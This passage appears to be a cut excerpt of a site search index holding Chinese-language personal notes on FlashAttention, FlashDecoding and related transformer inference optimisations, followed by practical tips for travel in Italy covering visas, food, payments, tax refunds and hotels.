<li>\u200b\u5bf9\u4e8e\u200b\u6bcf\u4e2a\u200b\u5757\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u5f53\u524d\u200b\u5757\u200b\u7684\u200b \\(QK^T\\) \u200b\u7ed3\u679c\u200b\uff0c\u200b\u7136\u540e\u200b\u8ba1\u7b97\u200b rowmax\uff08\u200b\u6bcf\u884c\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u4e00\u4e2a\u200b\u6700\u5927\u503c\u200b\uff09\uff0c\u200b\u6bcf\u4e2a\u200b\u5143\u7d20\u200b\u51cf\u53bb\u200b rowmax \u200b\u518d\u200b exp\uff0c\u200b\u5f97\u5230\u200b softmax \u200b\u51fd\u6570\u200b\u7684\u200b\u5206\u5b50\u200b\uff1b\u200b\u518d\u200b\u6c42\u548c\u200b\uff0c\u200b\u5f97\u5230\u200b softmax \u200b\u51fd\u6570\u200b\u7684\u200b\u5206\u6bcd\u200b</li> <li>\u200b\u628a\u200b\u521a\u7b97\u200b\u51fa\u6765\u200b\u7684\u200b softmax \u200b\u7ed3\u679c\u200b\u548c\u200b\u4e4b\u524d\u200b\u8ba1\u7b97\u200b\u7684\u200b softmax \u200b\u7ed3\u679c\u200b\u5408\u5e76\u200b\uff0c\u200b\u5f97\u5230\u200b\u4e00\u7ec4\u200b\u65b0\u200b\u7684\u200b softmax \u200b\u7cfb\u6570\u200b</li> <li>\u200b\u66f4\u65b0\u200b\u5f53\u524d\u200b\u7684\u200b\u8f93\u51fa\u200b\u77e9\u9635\u200b\uff1a\u200b\u628a\u200b\u65e7\u200b\u7684\u200b\u5206\u6bcd\u200b\u4e58\u200b\u56de\u6765\u200b\uff0c\u200b\u5c31\u200b\u5f97\u5230\u200b\u65e7\u200b\u7684\u200b\u5206\u5b50\u200b\uff0c\u200b\u628a\u200b\u65e7\u200b\u7684\u200b\u5206\u5b50\u200b\u4e58\u200b\u4e0a\u200b exp \u200b\u7cfb\u6570\u200b\uff0c\u200b\u518d\u200b\u52a0\u4e0a\u200b\u65b0\u200b\u7684\u200b\u5206\u5b50\u200b\uff0c\u200b\u7ed3\u679c\u200b\u518d\u200b\u9664\u4ee5\u200b\u65b0\u200b\u7684\u200b\u5206\u5b50\u200b\uff1b\u200b\u8fd9\u200b\u4e00\u6b65\u200b\u548c\u200b\u8fed\u4ee3\u200b\u66f4\u65b0\u200b\u5e73\u5747\u503c\u200b\u5f88\u200b\u50cf\u200b\uff1a\u200b\u65e7\u200b\u7684\u200b\u5e73\u5747\u503c\u200b\u4e58\u4ee5\u200b\u65e7\u200b\u7684\u200b\u5143\u7d20\u200b\u4e2a\u6570\u200b\uff0c\u200b\u52a0\u4e0a\u200b\u65b0\u200b\u7684\u200b\u5143\u7d20\u200b\u518d\u200b\u9664\u4ee5\u200b\u65b0\u200b\u7684\u200b\u5143\u7d20\u200b\u4e2a\u6570\u200b</li> </ol> <p>\u200b\u7136\u540e\u200b\u5728\u200b\u4e2d\u95f4\u200b\u7a7f\u63d2\u200b dropout \u200b\u548c\u200b masking \u200b\u7b49\u200b\u7ec6\u8282\u200b\uff0c\u200b\u5c31\u200b\u5f97\u5230\u200b\u4e86\u200b\u6700\u7ec8\u200b\u7684\u200b\u5b9e\u73b0\u200b\u3002\u200b\u5bf9\u200b\u8fd9\u4e2a\u200b\u8fc7\u7a0b\u200b\u8bb2\u200b\u7684\u200b\u6bd4\u8f83\u6e05\u695a\u200b\u7684\u200b\u662f\u200b\u4e0b\u9762\u200b\u8fd9\u4e2a\u200b\u56fe\u200b\uff1a</p> <p> </p> Flash Attention\uff08\u200b\u6765\u6e90\u200b\uff1aFlashAttention-2: Faster Attention with Better Parallelism and Work Partitioning\uff09 <p>\u200b\u53f3\u4e0b\u89d2\u200b Rescaling to correct denominator \u200b\u5c31\u662f\u200b\u4e0a\u9762\u200b\u8bf4\u200b\u7684\u200b\uff0c\u200b\u628a\u200b\u65e7\u200b\u7684\u200b\u5206\u6bcd\u200b\u4e58\u200b\u56de\u6765\u200b\uff0c\u200b\u518d\u200b\u8ba1\u7b97\u200b\u51fa\u65b0\u200b\u7684\u200b\u503c\u200b\u3002\u200b\u6807\u91cf\u200b\u4e58\u200b\u77e9\u9635\u200b\u5728\u200b\u4e0a\u9762\u200b\u7684\u200b\u5f0f\u5b50\u200b\u91cc\u200b\u8868\u793a\u200b\u6210\u200b\u4e86\u200b\u5bf9\u89d2\u200b\u77e9\u9635\u200b\u548c\u200b\u77e9\u9635\u200b\u7684\u200b\u4e58\u6cd5\u200b\u3002</p> <p>\u200b\u4e0d\u8fc7\u200b\uff0c\u200b\u8fd9\u4efd\u200b\u4f2a\u200b\u4ee3\u7801\u200b\u8ddd\u79bb\u200b\u5b9e\u9645\u200b\u7684\u200b CUDA \u200b\u5b9e\u73b0\u200b\uff0c\u200b\u8fd8\u6709\u200b\u5f88\u591a\u200b\u7ec6\u8282\u200b\u4e0a\u200b\u7684\u200b\u4f18\u5316\u200b\u3002\u200b\u6b64\u5916\u200b\uff0c\u200b\u8bba\u6587\u200b\u8fd8\u200b\u5bf9\u200b\u68af\u5ea6\u200b\u53cd\u5411\u200b\u4f20\u64ad\u200b\u8fdb\u884c\u200b\u4e86\u200b\u4f18\u5316\u200b\uff0c\u200b\u6bd5\u7adf\u200b\u662f\u200b\u670d\u52a1\u200b\u4e8e\u200b\u8bad\u7ec3\u200b\uff1a\u200b\u601d\u8def\u200b\u662f\u200b\uff0c\u200b\u524d\u5411\u200b\u8ba1\u7b97\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u56e0\u4e3a\u200b kernel fusion \u200b\u7684\u200b\u539f\u56e0\u200b\uff0c\u200b\u8df3\u8fc7\u200b\u4e86\u200b\u4e2d\u95f4\u200b\u7ed3\u679c\u200b\u7684\u200b\u8fd0\u7b97\u200b\uff0c\u200b\u6240\u4ee5\u200b\u53cd\u5411\u200b\u4f20\u64ad\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u91cd\u65b0\u200b\u8ba1\u7b97\u200b\u4e00\u4e0b\u200b attention\uff0c\u200b\u518d\u6c42\u200b\u68af\u5ea6\u200b\u3002</p>"},{"location":"software/transformer.html#flashattention-2","title":"FlashAttention 2","text":"<p>\u200b\u8bba\u6587\u200b\uff1aFlashAttention-2: Faster Attention with Better Parallelism and Work Partitioning</p> <p>\u200b\u4ee3\u7801\u200b\uff1aDao-AILab/flash-attention</p> <p>FlashAttention 2 \u200b\u76f8\u6bd4\u200b FlashAttention \u200b\u7684\u200b\u4e3b\u8981\u200b\u533a\u522b\u200b\u662f\u200b\u5e76\u884c\u200b\u7684\u200b\u65b9\u5f0f\u200b\u3002\u200b\u7b2c\u4e00\u4e2a\u200b\u7248\u672c\u200b\u662f\u200b\u5728\u200b batch \u200b\u548c\u200b head \u200b\u7ef4\u5ea6\u200b\u4e0a\u200b\u8fdb\u884c\u200b\u5e76\u884c\u200b\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u6bcf\u4e2a\u200b CUDA thread block \u200b\u5bf9\u5e94\u200b\u4e00\u4e2a\u200b batch size \u200b\u548c\u200b\u4e00\u4e2a\u200b attention head\uff0c\u200b\u4e00\u5171\u200b\u6709\u200b batch size \u200b\u4e58\u4ee5\u200b head \u200b\u4e2a\u6570\u200b\u90a3\u4e48\u200b\u591a\u4e2a\u200b thread block\u3002</p> <p>\u200b\u800c\u200b\u7b2c\u4e8c\u4e2a\u200b\u7248\u672c\u200b\u5728\u200b sequence length \u200b\u7ef4\u5ea6\u200b\u4e0a\u200b\u4e5f\u200b\u5f15\u5165\u200b\u4e86\u200b\u5e76\u884c\u200b\uff0c\u200b\u4f7f\u5f97\u200b GPU \u200b\u7684\u200b\u5229\u7528\u7387\u200b\u53ef\u4ee5\u200b\u7ee7\u7eed\u200b\u63d0\u5347\u200b\u3002\u200b\u6b64\u5916\u200b\uff0c\u200b\u5728\u200b\u8ba1\u7b97\u200b\u5c40\u90e8\u200b softmax \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e5f\u200b\u505a\u200b\u4e86\u200b\u4fee\u6539\u200b\uff1a\u200b\u4e0d\u200b\u7740\u6025\u200b\u8ba1\u7b97\u200b\u5c40\u90e8\u200b\u7684\u200b softmax\uff0c\u200b\u800c\u662f\u200b\u5206\u522b\u200b\u7ef4\u62a4\u200b\u5206\u5b50\u200b\u548c\u200b\u5206\u6bcd\u200b\uff0c\u200b\u5230\u200b\u7b97\u200b\u5b8c\u200b\u4e86\u200b\u4ee5\u540e\u200b\uff0c\u200b\u518d\u7b97\u200b\u5206\u5b50\u200b\u9664\u4ee5\u200b\u575f\u5893\u200b\u3002</p>"},{"location":"software/transformer.html#flashdecoding","title":"FlashDecoding","text":"<p>\u200b\u535a\u5ba2\u200b\uff1aFlash-Decoding for long-context inference</p> <p>Flash Decoding \u200b\u662f\u200b\u9488\u5bf9\u200b\u957f\u200b\u4e0a\u4e0b\u6587\u200b\u573a\u666f\u200b\u4e0b\u200b\u7684\u200b\u63a8\u7406\u200b\uff1aKV cache \u200b\u7684\u200b\u8bfb\u53d6\u200b\u53d8\u6210\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u74f6\u9888\u200b\u3002\u200b\u6240\u4ee5\u200b Flash-Decoding \u200b\u7684\u200b\u601d\u8def\u200b\u5c31\u662f\u200b\uff0c\u200b\u5e76\u884c\u200b\u8bfb\u53d6\u200b KV-cache\uff0c\u200b\u5e76\u4e14\u200b\u5728\u200b sequence length \u200b\u7ef4\u5ea6\u200b\u4e0a\u200b\u5e76\u884c\u200b attention \u200b\u8ba1\u7b97\u200b\u3002\u200b\u5f53\u7136\u200b\u4e86\u200b\uff0c\u200b\u5e76\u884c\u200b\u4e86\u200b\u4ee5\u540e\u200b\uff0c\u200b\u5c31\u8981\u200b\u62c6\u6210\u200b\u591a\u5757\u200b\u5206\u522b\u200b\u6c42\u200b softmax\uff0c\u200b\u4e5f\u200b\u9700\u8981\u200b Flash Attention \u200b\u7684\u200b\u5408\u5e76\u200b\u65b9\u6cd5\u200b\u6765\u200b\u4fdd\u8bc1\u200b\u6700\u7ec8\u200b softmax \u200b\u7ed3\u679c\u200b\u7684\u200b\u6b63\u786e\u6027\u200b\u3002</p>"},{"location":"software/transformer.html#flashdecoding_1","title":"FlashDecoding++","text":"<p>\u200b\u8bba\u6587\u200b\uff1aFLASHDECODING++: FASTER LARGE LANGUAGE MODEL INFERENCE ON GPUS</p> <p>\u200b\u8fd9\u7bc7\u200b\u8bba\u6587\u200b\u4e5f\u200b\u662f\u200b\u9488\u5bf9\u200b transformer \u200b\u63a8\u7406\u200b\u7684\u200b\u4f18\u5316\u200b\uff0c\u200b\u4e3b\u8981\u200b\u7684\u200b\u4f18\u5316\u200b\u70b9\u200b\uff1a</p> <ol> <li>Flash Attention \u200b\u8bba\u6587\u200b\u89e3\u51b3\u200b\u4e86\u200b softmax \u200b\u7684\u200b\u5206\u5757\u200b\u8ba1\u7b97\u200b\u95ee\u9898\u200b\uff0c\u200b\u4f46\u662f\u200b\u6bcf\u6b21\u200b\u9700\u8981\u200b\u8ba1\u7b97\u200b\u4e00\u4e2a\u200b max\uff1bFlashDecoding++ \u200b\u9009\u62e9\u200b\u6839\u636e\u200b\u6570\u636e\u200b\u7684\u200b\u5206\u5e03\u200b\u53bb\u200b\u4f30\u8ba1\u200b\u4e00\u4e2a\u200b max\uff0c\u200b\u4e4b\u540e\u200b\u518d\u200b\u7ea0\u6b63\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u51cf\u5c11\u200b\u4e00\u4e9b\u200b\u540c\u6b65\u200b</li> <li>\u200b\u9488\u5bf9\u200b batch \u200b\u7ef4\u5ea6\u200b\u5c0f\u200b\u7684\u200b\u77e9\u9635\u200b\u4e58\u6cd5\u200b\u8fdb\u884c\u200b\u4f18\u5316\u200b</li> </ol>"},{"location":"software/transformer.html#_3","title":"\u53c2\u8003\u6587\u732e","text":"<ul> <li>Speeding up the GPT - KV cache</li> <li>\u200b\u6700\u65b0\u200b\u6700\u5168\u200b GPT-3 \u200b\u6a21\u578b\u200b\u7f51\u7edc\u7ed3\u6784\u200b\u8be6\u7ec6\u200b\u89e3\u6790\u200b</li> <li>Transformer Inference Arithmetic</li> <li>Understanding FLOPs-per-token estimates from OpenAI\u2019s scaling laws</li> <li>\u200b\u62c6\u200b Transformer \u200b\u7cfb\u5217\u200b\u4e8c\u200b\uff1aMulti-Head Attention \u200b\u673a\u5236\u200b\u8be6\u89e3\u200b</li> <li>Past_key_values - why not past_key_values_queries?</li> </ul>"},{"location":"travel/italy.html","title":"\u610f\u5927\u5229","text":""},{"location":"travel/italy.html#_2","title":"\u65c5\u884c\u200b\u524d","text":""},{"location":"travel/italy.html#_3","title":"\u7b7e\u8bc1","text":"<p>\u200b\u610f\u5927\u5229\u200b\u7b7e\u8bc1\u200b\u53ef\u4ee5\u200b\u5728\u200b VFS Global \u200b\u7684\u200b\u7b7e\u8bc1\u200b\u7533\u8bf7\u200b\u4e2d\u5fc3\u200b\u9012\u7b7e\u200b\uff0c\u200b\u9700\u8981\u200b\u6839\u636e\u200b\u672c\u4eba\u200b\u6240\u5728\u200b\u7684\u200b\uff08\u200b\u6839\u636e\u200b\u6237\u53e3\u200b\u5730\u200b/\u200b\u5de5\u4f5c\u200b\u5730\u200b/\u200b\u4e0a\u5b66\u200b\u5730\u200b\uff09\u200b\u9886\u533a\u200b\uff0c\u200b\u53bb\u200b\u627e\u200b\u5bf9\u5e94\u200b\u7684\u200b\u7b7e\u8bc1\u200b\u7533\u8bf7\u200b\u4e2d\u5fc3\u200b\uff0c\u200b\u4e0d\u200b\u786e\u5b9a\u200b\u7684\u8bdd\u200b\u53ef\u4ee5\u200b\u53d1\u90ae\u4ef6\u200b\u95ee\u200b VFS Global\u3002\u200b\u9012\u7b7e\u200b\u9700\u8981\u200b\u63d0\u524d\u200b\u9884\u7ea6\u200b\uff0c\u200b\u9700\u8981\u200b\u51c6\u5907\u200b\u7684\u200b\u6750\u6599\u200b\u53ef\u4ee5\u200b\u5728\u200b VFS Global \u200b\u67e5\u200b\u5230\u200b\uff0c\u200b\u65c5\u884c\u793e\u200b\u4e5f\u200b\u6709\u200b\u7b7e\u8bc1\u200b\u7533\u8bf7\u6750\u6599\u200b\u7684\u200b\u51c6\u5907\u200b\u670d\u52a1\u200b\u3002\u200b\u610f\u5927\u5229\u200b\u5c5e\u4e8e\u200b\u7533\u6839\u200b\u5730\u533a\u200b\uff0c\u200b\u6240\u4ee5\u200b\u53ef\u4ee5\u200b\u7528\u200b\u610f\u5927\u5229\u200b\u7b7e\u8bc1\u200b\u53bb\u200b\u7533\u6839\u200b\u5730\u533a\u200b\u5176\u4ed6\u200b\u56fd\u5bb6\u200b\uff0c\u200b\u4f46\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u7b7e\u8bc1\u200b\u7684\u200b\u8981\u6c42\u200b\u3002</p>"},{"location":"travel/italy.html#_4","title":"\u51c6\u5907","text":"<p>\u200b\u51fa\u884c\u200b\u524d\u200b\uff0c\u200b\u9700\u8981\u200b\u505a\u597d\u200b\u7684\u200b\u51c6\u5907\u200b\uff1a</p> <ol> <li>\u200b\u62a4\u7167\u200b</li> <li>\u200b\u9632\u76d7\u200b\u63aa\u65bd\u200b\uff08\u200b\u6d77\u5173\u200b\u9501\u200b\uff0c\u200b\u516b\u5b57\u200b\u6263\u200b\uff0c\u200b\u8170\u5305\u200b\uff09</li> <li>\u200b\u836f\u54c1\u200b\uff08\u200b\u611f\u5192\u836f\u200b\uff0c\u200b\u80c3\u836f\u200b\uff0c\u200b\u8fc7\u654f\u200b\u836f\u200b\uff0c\u200b\u9632\u6652\u200b\uff09</li> <li>\u200b\u7f51\u7edc\u200b\uff08\u200b\u56fd\u5185\u200b\u8fd0\u8425\u5546\u200b\u7684\u200b\u56fd\u9645\u6f2b\u6e38\u200b\uff0c\u200b\u5929\u9645\u200b\u901a\u200b\uff0c\u200b\u7f51\u4e0a\u200b\u8d2d\u4e70\u200b\u7684\u200b\u591a\u56fd\u200b\u6d41\u91cf\u200b\u5361\u200b\uff0c\u200b\u5728\u200b\u5f53\u5730\u200b\u8d2d\u4e70\u200b\u7684\u200b\u672c\u5730\u200b\u6d41\u91cf\u200b\u5361\u200b\uff0c\u200b\u6ce8\u610f\u200b\u662f\u200b\u5b9e\u4f53\u200b SIM \u200b\u5361\u200b\u8fd8\u662f\u200b eSIM\uff09</li> <li>\u200b\u8f6c\u6362\u200b\u63d2\u5934\u200b\uff08\u200b\u6700\u200b\u597d\u610f\u200b\u6807\u200b\uff0c\u200b\u5176\u6b21\u200b\u6b27\u6807\u200b\uff09\u200b\u548c\u200b\u5145\u7535\u200b\u5b9d\u200b\uff08\u200b\u4e00\u4e2a\u200b 10000 mAh \u200b\u7684\u200b\u5145\u7535\u200b\u5b9d\u5728\u200b\u884c\u7a0b\u200b\u6bd4\u8f83\u200b\u7d27\u200b\u7684\u200b\u65f6\u5019\u200b\u4e0d\u591f\u200b\u7528\u200b\uff09</li> </ol>"},{"location":"travel/italy.html#_5","title":"\u65c5\u884c\u200b\u4e2d","text":""},{"location":"travel/italy.html#_6","title":"\u996e\u98df","text":"<p>\u200b\u610f\u5927\u5229\u200b\u7684\u200b\u98df\u54c1\u200b\u603b\u4f53\u200b\u6765\u8bf4\u200b\u662f\u200b\u6bd4\u8f83\u200b\u597d\u5403\u200b\u7684\u200b\uff0c\u200b\u6bd4\u8f83\u200b\u9002\u5408\u200b\u56fd\u5185\u200b\u7684\u200b\u53e3\u5473\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u53bb\u200b\u4e2d\u9910\u9986\u200b\uff0c\u200b\u5177\u4f53\u200b\u5730\u200b\uff1a</p> <ol> <li>\u200b\u62ab\u8428\u200b Pizza\uff1a\u200b\u4e0d\u200b\u63a8\u8350\u200b\uff0c\u200b\u610f\u5f0f\u200b\u7684\u200b\u62ab\u8428\u200b\u6ca1\u6709\u200b\u56fd\u5185\u200b\u6539\u826f\u200b\u8fc7\u200b\u7684\u200b\u7f8e\u5f0f\u200b\u62ab\u8428\u200b\u597d\u5403\u200b</li> <li>\u200b\u5343\u200b\u5c42\u9762\u200b Lasagna\uff1a\u200b\u63a8\u8350\u200b\uff0c\u200b\u7279\u522b\u200b\u63a8\u8350\u200b\u535a\u6d1b\u5c3c\u4e9a\u200b\u5343\u200b\u5c42\u9762\u200b</li> <li>\u200b\u70e9\u996d\u200b Risotto\uff1a\u200b\u63a8\u8350\u200b\uff0c\u200b\u6ca1\u200b\u9047\u5230\u200b\u4e0d\u200b\u597d\u5403\u200b\u7684\u200b</li> <li>\u200b\u725b\u8089\u200b\uff1a\u200b\u63a8\u8350\u200b\uff0c\u200b\u610f\u5927\u5229\u200b\u7684\u200b\u725b\u8089\u200b\u597d\u5403\u200b\uff0c\u200b\u76f4\u63a5\u200b\u9009\u200b medium well</li> <li>\u200b\u51b0\u6dc7\u6dcb\u200b Gelato\uff1a\u200b\u63a8\u8350\u200b</li> <li>\u200b\u70e4\u200b\u852c\u83dc\u200b Grilled Vegetables\uff1a\u200b\u4e00\u822c\u200b\uff0c\u200b\u4f46\u662f\u200b\u81f3\u5c11\u200b\u662f\u200b\u852c\u83dc\u200b\uff0c\u200b\u9910\u5385\u200b\u4e00\u822c\u200b\u90fd\u200b\u6709\u200b</li> </ol> <p>\u200b\u6ce8\u610f\u200b\u610f\u5927\u5229\u200b\u4e0d\u540c\u200b\u5730\u533a\u200b\u7684\u200b\u98df\u7269\u200b\u597d\u5403\u200b\u7a0b\u5ea6\u200b\u6709\u200b\u8f83\u5927\u200b\u5dee\u5f02\u200b\uff1a</p> <ol> <li>\u200b\u4f5b\u7f57\u4f26\u8428\u200b\u53ca\u200b\u66f4\u5317\u200b\u7684\u200b\u57ce\u5e02\u200b\uff08\u200b\u4f5b\u7f57\u4f26\u8428\u200b\uff0c\u200b\u7c73\u5170\u200b\uff0c\u200b\u90fd\u7075\u200b\uff0c\u200b\u5a01\u5c3c\u65af\u200b\uff0c\u200b\u535a\u6d1b\u5c3c\u4e9a\u200b\uff0c\u200b\u6bd4\u8428\u200b\uff09\u200b\u660e\u663e\u200b\u66f4\u200b\u597d\u5403\u200b</li> <li>\u200b\u4f5b\u7f57\u4f26\u8428\u200b\u4ee5\u5357\u200b\u7684\u200b\u57ce\u5e02\u200b\uff08\u200b\u7f57\u9a6c\u200b\uff0c\u200b\u9521\u8036\u7eb3\u200b\uff09\u200b\u660e\u663e\u200b\u4e0d\u200b\u90a3\u4e48\u200b\u597d\u5403\u200b</li> </ol> <p>\u200b\u559c\u6b22\u200b\u610f\u5927\u5229\u200b\u83dc\u200b\u7684\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u591a\u53bb\u200b\u5317\u65b9\u200b\u57ce\u5e02\u200b\u3002</p> <p>\u200b\u610f\u5927\u5229\u200b\u4e70\u5230\u200b\u7684\u200b\u996e\u7528\u6c34\u200b\u5206\u4e3a\u200b\u4e24\u79cd\u200b\uff0c\u200b\u666e\u901a\u200b\u7684\u200b\u6c34\u200b\uff08Still Water\uff09\u200b\u548c\u200b\u6c14\u6ce1\u200b\u6c34\u200b\uff08Sparkling Water/Frizzante\uff09\uff0c\u200b\u901a\u5e38\u200b\u4ef7\u683c\u200b\u76f8\u540c\u200b\u3002</p>"},{"location":"travel/italy.html#_7","title":"\u6d88\u8d39","text":"<p>\u200b\u610f\u5927\u5229\u200b\u5927\u90e8\u5206\u200b\u7684\u200b\u5730\u70b9\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u7528\u200b\u4fe1\u7528\u5361\u200b\uff0c\u200b\u4e00\u822c\u200b\u7528\u200b VISA/Mastercard \u200b\u5c31\u200b\u53ef\u4ee5\u200b\u3002\u200b\u63a8\u8350\u200b\u7528\u200b\u652f\u6301\u200b NFC \u200b\u7684\u200b\u4fe1\u7528\u5361\u200b\uff0c\u200b\u5982\u679c\u200b\u624b\u673a\u200b NFC \u200b\u652f\u6301\u200b\u5219\u200b\u66f4\u597d\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u907f\u514d\u200b\u9891\u7e41\u200b\u5730\u200b\u62ff\u51fa\u200b\u94b1\u5305\u200b\u3002\u200b\u6709\u200b\u7684\u200b\u5c0f\u200b POS \u200b\u673a\u53ea\u200b\u652f\u6301\u200b NFC\uff0c\u200b\u6ca1\u6709\u200b\u5237\u5361\u200b\u7684\u200b\u5730\u65b9\u200b\uff0c\u200b\u5c31\u200b\u9700\u8981\u200b\u5e97\u5458\u200b\u638f\u51fa\u200b\u66f4\u5927\u200b\u7684\u200b POS \u200b\u673a\u200b\u3002</p> <p>\u200b\u610f\u5927\u5229\u200b\u7684\u200b\u73b0\u91d1\u200b\u5219\u200b\u662f\u200b\u7528\u200b\u7684\u200b\u6b27\u5143\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u63d0\u524d\u200b\u5728\u200b\u56fd\u5185\u200b\u6362\u597d\u200b\u3002100 \u200b\u6b27\u5728\u200b\u6536\u94f6\u53f0\u200b\u4e00\u822c\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u627e\u200b\u7684\u200b\u5f00\u200b\uff0c\u200b\u53ea\u6709\u200b\u5395\u6240\u200b\u6216\u8005\u200b\u5c0f\u644a\u200b\u9700\u8981\u200b\u96f6\u94b1\u200b\u3002</p>"},{"location":"travel/italy.html#_8","title":"\u9000\u7a0e","text":"<p>\u200b\u8d2d\u7269\u200b\u65f6\u200b\uff0c\u200b\u548c\u200b\u5546\u5bb6\u200b\u8bf4\u200b\u8981\u200b\u9000\u7a0e\u200b\uff0c\u200b\u5546\u5bb6\u200b\u4f1a\u200b\u63d0\u4f9b\u200b\u4e00\u4e2a\u200b\u4fe1\u5c01\u200b\uff0c\u200b\u91cc\u9762\u200b\u662f\u200b\u9000\u7a0e\u200b\u7684\u200b\u76f8\u5173\u200b\u6750\u6599\u200b\uff0c\u200b\u4f60\u200b\u9700\u8981\u200b\u63d0\u4f9b\u200b\u9000\u7a0e\u200b\u9014\u5f84\u200b\uff08\u200b\u652f\u4ed8\u5b9d\u200b/\u200b\u4fe1\u7528\u5361\u200b/\u200b\u73b0\u91d1\u200b\u7b49\u200b\uff09\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b\u9000\u7a0e\u200b\u516c\u53f8\u200b\u7684\u200b App \u200b\u6216\u200b\u7f51\u7ad9\u200b\u4e0a\u200b\u67e5\u8be2\u200b\u9000\u7a0e\u200b\u8fdb\u5ea6\u200b\u3002</p> <p>\u200b\u610f\u5927\u5229\u200b\u9000\u7a0e\u200b\u5728\u200b\u7f51\u4e0a\u200b\u6709\u200b\u5f88\u591a\u200b\u653b\u7565\u200b\uff0c\u200b\u4f46\u200b\u5b83\u4eec\u200b\u5728\u200b\u5982\u4e0b\u200b\u95ee\u9898\u200b\u4e0a\u200b\u8bf4\u6cd5\u4e0d\u4e00\u200b\uff1a</p> <ol> <li>\u200b\u662f\u5426\u200b\u8981\u200b\u53bb\u200b\u6d77\u5173\u200b\u76d6\u7ae0\u200b</li> <li>\u200b\u662f\u5426\u200b\u4f1a\u200b\u88ab\u200b\u6d77\u5173\u200b\u67e5\u9a8c\u200b</li> <li>\u200b\u662f\u5426\u200b\u53ea\u80fd\u200b\u6258\u8fd0\u200b/\u200b\u624b\u63d0\u200b</li> </ol> <p>\u200b\u5b9e\u8df5\u200b\u4e2d\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u5168\u90e8\u200b\u9000\u7a0e\u200b\u5546\u54c1\u200b\u90fd\u200b\u5728\u200b\u610f\u5927\u5229\u200b\u8d2d\u4e70\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6d77\u5173\u200b\u4e0d\u200b\u9700\u8981\u200b\u76d6\u7ae0\u200b\uff0c\u200b\u5728\u200b\u673a\u573a\u200b\u627e\u5230\u200b\u9000\u7a0e\u200b\u516c\u53f8\u200b\uff08\u200b\u6bd4\u5982\u200b Global Blue\uff09\u200b\u7684\u200b\u67dc\u53f0\u200b\uff08\u200b\u6216\u200b\u81ea\u52a9\u200b\u673a\u200b\uff09\uff0c\u200b\u628a\u200b\u5546\u5bb6\u200b\u51c6\u5907\u200b\u597d\u200b\u7684\u200b\u6750\u6599\u200b\u6309\u7167\u200b\u63d0\u793a\u200b\u626b\u63cf\u200b\u5373\u53ef\u200b\uff0c\u200b\u5728\u200b\u503c\u673a\u200b\u548c\u200b\u6258\u8fd0\u200b\u524d\u200b\u5b8c\u6210\u200b\uff0c\u200b\u6ca1\u6709\u200b\u989d\u5916\u200b\u7684\u200b\u6d77\u5173\u68c0\u67e5\u200b\u73af\u8282\u200b\uff0c\u200b\u4e5f\u200b\u65e0\u6240\u8c13\u200b\u6258\u8fd0\u200b\u8fd8\u662f\u200b\u624b\u63d0\u200b\u3002</p> <p>\u200b\u6ce8\u200b\uff1a\u200b\u672c\u4eba\u200b\u6ca1\u6709\u200b\u5bf9\u200b\u9000\u7a0e\u200b\u76f8\u5173\u200b\u653f\u7b56\u200b\u8fdb\u884c\u200b\u6df1\u5165\u200b\u7684\u200b\u4e86\u89e3\u200b\uff0c\u200b\u4e0d\u200b\u4fdd\u8bc1\u200b\u8fd9\u4e2a\u200b\u6d41\u7a0b\u200b\u662f\u5426\u200b\u5b8c\u5168\u6b63\u786e\u200b\u3002</p>"},{"location":"travel/italy.html#_9","title":"\u9152\u5e97","text":"<p>\u200b\u610f\u5927\u5229\u200b\u7684\u200b\u9152\u5e97\u200b\uff0c\u200b\u5728\u200b\u5165\u4f4f\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u901a\u5e38\u200b\u9700\u8981\u200b\u7f34\u7eb3\u200b City Tax\uff08\u200b\u5c0f\u200b\u57ce\u5e02\u200b\u6216\u8005\u200b\u4e61\u4e0b\u200b\u53ef\u80fd\u200b\u4e0d\u7528\u200b\uff09\uff0c\u200b\u6bcf\u4eba\u6bcf\u5929\u200b\u51e0\u200b\u6b27\u5143\u200b\u3002\u200b\u901a\u5e38\u200b\u8fd9\u4e2a\u200b\u94b1\u200b\u662f\u200b\u7531\u200b\u65c5\u884c\u793e\u200b\u8d1f\u8d23\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5982\u679c\u200b\u81ea\u5df1\u200b\u57ab\u4ed8\u200b\u4e86\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u627e\u200b\u65c5\u884c\u793e\u200b\u62a5\u9500\u200b\u3002</p>"},{"location":"travel/italy.html#_10","title":"\u5395\u6240","text":"<p>\u200b\u610f\u5927\u5229\u200b\u7684\u200b\u516c\u5171\u5395\u6240\u200b\uff0c\u200b\u5c11\u6570\u200b\u514d\u8d39\u200b\uff0c\u200b\u591a\u6570\u200b\u9700\u8981\u200b\u82b1\u8d39\u200b 1 \u200b\u6216\u200b 1.5 